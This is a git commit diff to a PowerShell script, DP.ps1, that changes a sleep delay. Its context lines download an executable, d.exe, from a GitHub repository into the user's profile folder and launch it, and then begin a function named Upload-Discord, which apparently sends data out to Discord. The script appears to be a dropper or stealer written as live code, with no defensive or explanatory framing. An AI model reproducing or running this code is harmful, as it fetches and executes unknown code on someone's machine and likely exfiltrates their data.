a3b307ff1ef4bcaedbb66d9ec91129bd7ce9cbb0
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-01 23:07:56 -0600

    Update DP.ps1

--- DP.ps1
+++ DP.ps1
@@ -1,6 +1,6 @@
 iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
 Start-process "$env:USERPROFILE\d.exe"
-start sleep 15
+start-sleep 5
 function Upload-Discord {
 
 [CmdletBinding()]
